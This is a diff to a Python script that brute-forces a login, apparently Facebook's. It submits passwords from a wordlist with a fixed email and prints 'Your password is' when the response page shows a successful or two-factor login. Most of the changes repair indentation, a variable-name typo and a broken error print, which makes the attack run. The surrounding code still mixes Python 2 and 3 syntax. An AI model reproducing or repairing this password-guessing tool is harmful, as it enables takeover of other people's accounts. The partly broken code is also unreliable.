@@ -41,18 +41,16 @@ while file:
 	print str(i) +" : ",passw
 	response = browser.open(post_url)
 	try:
-		if response.code == 200:
-			browser.select_form(nr=0)
-			browser.form['email'] = email
-			browser.form['pass'] = passw
-			response = browser.submit()
-			response_data = response.read()
-			if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
-				decode_response = response_data.decode('utf-8')
-				print('Your password is : ',passw)
-				print('Response Data:',decoded _response)
-break
+    if response.code == 200:
+        browser.select_form(nr=0)
+        browser.form['email'] = email
+        browser.form['pass'] = passw
+        response = browser.submit()
+        response_data = response.read()
+        if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
+            decoded_response = response_data.decode('utf-8')
+            print('Your password is:', passw)
+            print('Response Data:', decoded_response)
+            break
 except Exception as e:
-print ('Error:
-e)
-
+    print('Error:', e)
